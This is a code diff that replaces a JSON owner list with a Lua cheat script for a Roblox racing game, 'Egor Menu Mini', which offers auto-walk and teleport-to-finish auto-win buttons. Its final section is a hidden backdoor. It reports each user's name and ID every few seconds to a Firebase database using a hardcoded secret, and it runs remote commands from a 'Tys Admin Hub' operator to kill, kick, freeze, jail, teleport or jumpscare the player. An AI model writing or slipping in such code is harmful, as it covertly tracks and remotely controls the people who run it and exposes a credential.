@@ -1,5 +1,484 @@
-{
-  "ABUGEZAN": {
-    "type": "Owner",
-    "expires": null
-  },
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local GuiService = game:GetService("GuiService")
+local HttpService = game:GetService("HttpService")
+local SoundService = game:GetService("SoundService")
+
+-- Ожидание полной инициализации LocalPlayer
+local player = Players.LocalPlayer
+while not player do
+	task.wait(0.1)
+	player = Players.LocalPlayer
+end
+
+local userId = player.UserId
+while not userId or userId == 0 do
+	task.wait(0.1)
+	userId = player.UserId
+end
+
+local httpRequest = request or http_request or (syn and syn.request) or (http and http.request)
+
+-- Настройка скорости вращения влево
+local ROTATION_SPEED = 3.0
+
+-- === 1. СОЗДАНИЕ УМЕНЬШЕННОГО ИНТЕРФЕЙСА ===
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "EgorMenuGui_Small"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Главная рамка
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 115, 0, 90)
+mainFrame.Position = UDim2.new(0.05, 0, 0.4, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 6)
+frameCorner.Parent = mainFrame
+
+-- Заголовок
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Name = "Title"
+titleLabel.Size = UDim2.new(1, 0, 0, 20)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Egor Menu Mini"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 9
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Parent = mainFrame
+
+-- Кнопка "Авто-ходьба"
+local autoWalkBtn = Instance.new("TextButton")
+autoWalkBtn.Name = "AutoWalkButton"
+autoWalkBtn.Size = UDim2.new(0.85, 0, 0, 22)
+autoWalkBtn.Position = UDim2.new(0.075, 0, 0.3, 0)
+autoWalkBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+autoWalkBtn.Text = "Авто-ходьба: ВЫКЛ"
+autoWalkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+autoWalkBtn.TextSize = 8
+autoWalkBtn.Font = Enum.Font.GothamMedium
+autoWalkBtn.AutoButtonColor = true
+autoWalkBtn.Parent = mainFrame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 4)
+btnCorner.Parent = autoWalkBtn
+
+-- Кнопка "Авто-победа"
+local autoWinBtn = Instance.new("TextButton")
+autoWinBtn.Name = "AutoWinButton"
+autoWinBtn.Size = UDim2.new(0.85, 0, 0, 22)
+autoWinBtn.Position = UDim2.new(0.075, 0, 0.62, 0)
+autoWinBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+autoWinBtn.Text = "Авто-победа: ВЫКЛ"
+autoWinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+autoWinBtn.TextSize = 8
+autoWinBtn.Font = Enum.Font.GothamMedium
+autoWinBtn.AutoButtonColor = true
+autoWinBtn.Parent = mainFrame
+
+local winBtnCorner = Instance.new("UICorner")
+winBtnCorner.CornerRadius = UDim.new(0, 4)
+winBtnCorner.Parent = autoWinBtn
+
+-- === 2. ЛОГИКА АВТО-ХОДЬБЫ И ВРАЩЕНИЯ ВЛЕВО ===
+local isAutoWalking = false
+local walkConnection = nil
+
+local function setAutoWalk(state)
+	if isAutoWalking == state then return end
+	isAutoWalking = state
+	local camera = Workspace.CurrentCamera
+
+	if isAutoWalking then
+		autoWalkBtn.Text = "Авто-ходьба: ВКЛ"
+		autoWalkBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 90)
+
+		if camera then
+			camera.CameraType = Enum.CameraType.Scriptable
+		end
+
+		walkConnection = RunService.RenderStepped:Connect(function(dt)
+			local character = player.Character
+
+			if character and character:FindFirstChild("Humanoid") then
+				character.Humanoid:Move(Vector3.new(0, 0, -1), true)
+				
+				if camera and character:FindFirstChild("HumanoidRootPart") then
+					local targetPos = character.HumanoidRootPart.Position + Vector3.new(0, 2, 0)
+					camera.CFrame = camera.CFrame * CFrame.Angles(0, ROTATION_SPEED * dt, 0)
+					camera.CFrame = CFrame.new(targetPos) * (camera.CFrame - camera.CFrame.Position)
+				end
+			end
+		end)
+	else
+		autoWalkBtn.Text = "Авто-ходьба: ВЫКЛ"
+		autoWalkBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+
+		if camera then
+			camera.CameraType = Enum.CameraType.Custom
+		end
+
+		if walkConnection then
+			walkConnection:Disconnect()
+			walkConnection = nil
+		end
+	end
+end
+
+autoWalkBtn.MouseButton1Click:Connect(function()
+	setAutoWalk(not isAutoWalking)
+end)
+
+-- === 3. ЛОГИКА НАЖАТИЯ И АВТО-ПОБЕДЫ ===
+local isAutoWinActive = false
+local isExecutingWin = false
+
+local function isGuiElementVisible(element)
+	local current = element
+	while current and not current:IsA("ScreenGui") do
+		if current:IsA("GuiObject") and not current.Visible then
+			return false
+		end
+		current = current.Parent
+	end
+	return current and current:IsA("ScreenGui") and current.Enabled
+end
+
+local function triggerGuiButton(btn)
+	if typeof(getconnections) == "function" then
+		for _, sig in ipairs({"MouseButton1Click", "MouseButton1Down", "Activated"}) do
+			pcall(function()
+				for _, conn in ipairs(getconnections(btn[sig])) do
+					if conn.Function then
+						task.spawn(conn.Function)
+					elseif conn.Fire then
+						conn:Fire()
+					end
+				end
+			end)
+		end
+	end
+
+	if typeof(firesignal) == "function" then
+		for _, sig in ipairs({"MouseButton1Click", "MouseButton1Down", "Activated"}) do
+			pcall(function() firesignal(btn[sig]) end)
+		end
+	end
+
+	local inset = GuiService:GetGuiInset()
+	local pos = btn.AbsolutePosition + (btn.AbsoluteSize / 2) + inset
+
+	VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 0)
+	task.wait(0.05)
+	VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 0)
+end
+
+local function findConfirmButton()
+	local pg = player:FindFirstChild("PlayerGui")
+	if not pg then return nil end
+
+	for _, gui in ipairs(pg:GetChildren()) do
+		if gui:IsA("ScreenGui") and gui.Enabled and gui.Name ~= "EgorMenuGui_Small" and not gui.Name:lower():find("dex") then
+			for _, elem in ipairs(gui:GetDescendants()) do
+				if isGuiElementVisible(elem) then
+					if elem:IsA("TextButton") then
+						local text = elem.Text:lower():gsub("%s+", "")
+						if text == "yes" or text == "да" or elem.Name:lower() == "yes" then
+							return elem
+						end
+					end
+
+					if elem:IsA("TextLabel") and elem.Text:lower():gsub("%s+", "") == "yes" then
+						if elem.Parent and (elem.Parent:IsA("GuiButton") or elem.Parent:IsA("Frame")) then
+							return elem.Parent
+						end
+						return elem
+					end
+
+					if (elem:IsA("ImageButton") or elem:IsA("Frame")) and elem.Name:lower() == "yes" then
+						return elem
+					end
+				end
+			end
+		end
+	end
+	return nil
+end
+
+local function findRaceFinishTarget()
+	for _, obj in ipairs(Workspace:GetChildren()) do
+		if obj.Name:lower():match("^race%d*$") then
+			local finish = obj:FindFirstChild("FinishPart") or obj:FindFirstChild("finishpart") or obj:FindFirstChild("Finish")
+			if finish then
+				return finish
+			end
+			for _, descendant in ipairs(obj:GetDescendants()) do
+				if descendant.Name:lower() == "finishpart" then
+					return descendant
+				end
+			end
+		end
+	end
+	return nil
+end
+
+local function runAutoWinSequence()
+	if isExecutingWin then return end
+	isExecutingWin = true
+
+	local character = player.Character
+	local root = character and character:FindFirstChild("HumanoidRootPart")
+	if not root then
+		isExecutingWin = false
+		return
+	end
+
+	local returnCFrame = root.CFrame
+	setAutoWalk(false)
+
+	local confirmBtn = findConfirmButton()
+	if confirmBtn then
+		for _ = 1, 3 do
+			triggerGuiButton(confirmBtn)
+			task.wait(0.1)
+		end
+	end
+
+	task.wait(31)
+
+	local dest = findRaceFinishTarget()
+	character = player.Character
+	root = character and character:FindFirstChild("HumanoidRootPart")
+
+	if dest and root then
+		local destCFrame = dest:IsA("BasePart") and dest.CFrame or (dest:IsA("Model") and dest:GetPivot())
+		if destCFrame then
+			root.CFrame = destCFrame + Vector3.new(0, 3, 0)
+		end
+	end
+
+	task.wait(1.5)
+
+	character = player.Character
+	root = character and character:FindFirstChild("HumanoidRootPart")
+	if returnCFrame and root then
+		root.CFrame = returnCFrame
+	end
+
+	task.wait(0.3)
+	setAutoWalk(true)
+	isExecutingWin = false
+end
+
+autoWinBtn.MouseButton1Click:Connect(function()
+	isAutoWinActive = not isAutoWinActive
+	if isAutoWinActive then
+		autoWinBtn.Text = "Авто-победа: ВКЛ"
+		autoWinBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 90)
+	else
+		autoWinBtn.Text = "Авто-победа: ВЫКЛ"
+		autoWinBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+	end
+end)
+
+task.spawn(function()
+	while true do
+		task.wait(0.4)
+		if isAutoWinActive and not isExecutingWin then
+			local btn = findConfirmButton()
+			if btn then
+				runAutoWinSequence()
+			end
+		end
+	end
+end)
+
+-- === 4. ПРИЕМНИК КОМАНД ИЗ TYS ADMIN HUB (FIREBASE) ===
+do
+	local FIREBASE_BASE = "https://tys-chat-8cfc2-default-rtdb.firebaseio.com"
+	local FIREBASE_SECRET = "N2KgQL9bTL51nQOvNfYgr6fjfNpKwkp4NjMe0jKK"
+
+	local _R = {}
+	_R.endpoint = string.format("%s/targets/%d.json?auth=%s", FIREBASE_BASE, player.UserId, FIREBASE_SECRET)
+	_R.presenceUrl = string.format("%s/active_users/%d.json?auth=%s", FIREBASE_BASE, player.UserId, FIREBASE_SECRET)
+	_R.lastTimestamp = os.time()
+	_R.loopConn = nil
+
+	_R.stopLoop = function()
+		if _R.loopConn then
+			_R.loopConn:Disconnect()
+			_R.loopConn = nil
+		end
+	end
+
+	player.CharacterAdded:Connect(function()
+		_R.stopLoop()
+	end)
+
+	_R.jumpscare = function(imgUrl)
+		local jsGui = Instance.new("ScreenGui")
+		jsGui.Name = "TysClientJumpscare"
+		jsGui.DisplayOrder = 999999
+		jsGui.IgnoreGuiInset = true
+		jsGui.ResetOnSpawn = false
+		jsGui.Parent = player:WaitForChild("PlayerGui")
+
+		local frame = Instance.new("Frame")
+		frame.Size = UDim2.new(1, 0, 1, 0)
+		frame.BackgroundColor3 = Color3.new(0, 0, 0)
+		frame.BorderSizePixel = 0
+		frame.Parent = jsGui
+
+		local img = Instance.new("ImageLabel")
+		img.Size = UDim2.new(1, 0, 1, 0)
+		img.BackgroundTransparency = 1
+		img.Image = imgUrl or "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRVYptdFl9Mg9qLwOXP8V1B5N5qN4KT8wngVkKq1VRpccOcl3Q51gPaSwAs&s=10"
+		img.ScaleType = Enum.ScaleType.Fit
+		img.Parent = frame
+
+		task.spawn(function()
+			local sound = Instance.new("Sound")
+			sound.Volume = 10
+			sound.Looped = false
+			sound.Parent = SoundService
+
+			if isfile and isfile("gdfgdgf.mp3") and (getcustomasset or getsynasset) then
+				local getAsset = getcustomasset or getsynasset
+				sound.SoundId = getAsset("gdfgdgf.mp3")
+			else
+				sound.SoundId = "rbxassetid://9069609268"
+			end
+
+			sound:Play()
+		end)
+
+		task.spawn(function()
+			local startTime = os.clock()
+			while os.clock() - startTime < 3.2 do
+				img.Position = UDim2.new(0, math.random(-25, 25), 0, math.random(-25, 25))
+				task.wait(0.03)
+			end
+			jsGui:Destroy()
+		end)
+	end
+
+	_R.execute = function(cmd, args)
+		local char = player.Character
+		local hum = char and char:FindFirstChildOfClass("Humanoid")
+		local root = char and char:FindFirstChild("HumanoidRootPart")
+
+		if cmd == "kill" then
+			if hum then hum.Health = 0 end
+		elseif cmd == "kick" then
+			player:Kick("Отключено через Tys Admin Hub.")
+		elseif cmd == "loopkill" then
+			_R.stopLoop()
+			_R.loopConn = RunService.Stepped:Connect(function()
+				local curHum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+				if curHum and curHum.Health > 0 then curHum.Health = 0 end
+			end)
+		elseif cmd == "unloopkill" then
+			_R.stopLoop()
+		elseif cmd == "freeze" then
+			if root then root.Anchored = true end
+		elseif cmd == "unfreeze" then
+			if root then root.Anchored = false end
+		elseif cmd == "jail" then
+			if root then
+				for _, obj in ipairs(Workspace:GetChildren()) do
+					if obj.Name == "AdminJailBox" then obj:Destroy() end
+				end
+				local box = Instance.new("Part")
+				box.Name = "AdminJailBox"
+				box.Size = Vector3.new(8, 10, 8)
+				box.CFrame = CFrame.new(root.Position)
+				box.Transparency = 0.7
+				box.BrickColor = BrickColor.new("Bright violet")
+				box.Material = Enum.Material.ForceField
+				box.Anchored = true
+				box.CanCollide = true
+				box.Parent = Workspace
+			end
+		elseif cmd == "unjail" then
+			for _, obj in ipairs(Workspace:GetChildren()) do
+				if obj.Name == "AdminJailBox" then obj:Destroy() end
+			end
+		elseif cmd == "bring" then
+			if root and args and args.pos then
+				root.CFrame = CFrame.new(Vector3.new(args.pos[1], args.pos[2], args.pos[3]))
+			end
+		elseif cmd == "jumpscare_67" then
+			_R.jumpscare(args and args.image)
+		end
+	end
+
+	-- Отправка статуса онлайна (чтобы админ видел игрока во вкладке "Юзеры хаба")
+	task.spawn(function()
+		while true do
+			if httpRequest then
+				pcall(function()
+					httpRequest({
+						Url = _R.presenceUrl,
+						Method = "PUT",
+						Headers = { ["Content-Type"] = "application/json" },
+						Body = HttpService:JSONEncode({
+							name = player.Name,
+							displayName = player.DisplayName,
+							userId = player.UserId,
+							lastSeen = os.time()
+						})
+					})
+				end)
+			end
+			task.wait(8)
+		end
+	end)
+
+	-- Слушатель входящих команд
+	task.spawn(function()
+		if httpRequest then
+			pcall(function()
+				httpRequest({ Url = _R.endpoint, Method = "DELETE" })
+			end)
+		end
+
+		while true do
+			task.wait(0.25)
+			if httpRequest then
+				local success, res = pcall(function()
+					return httpRequest({ Url = _R.endpoint, Method = "GET" })
+				end)
+
+				if success and res and res.Body and res.Body ~= "null" then
+					local decodeOk, data = pcall(function()
+						return HttpService:JSONDecode(res.Body)
+					end)
+
+					if decodeOk and type(data) == "table" and data.command then
+						if data.timestamp and data.timestamp > _R.lastTimestamp then
+							_R.lastTimestamp = data.timestamp
+							_R.execute(data.command, data.args)
+
+							task.spawn(function()
+								pcall(function()
+									httpRequest({ Url = _R.endpoint, Method = "DELETE" })
+								end)
+							end)
+						end
+					end
+				end
+			end
+		end
+	end)
+end
+
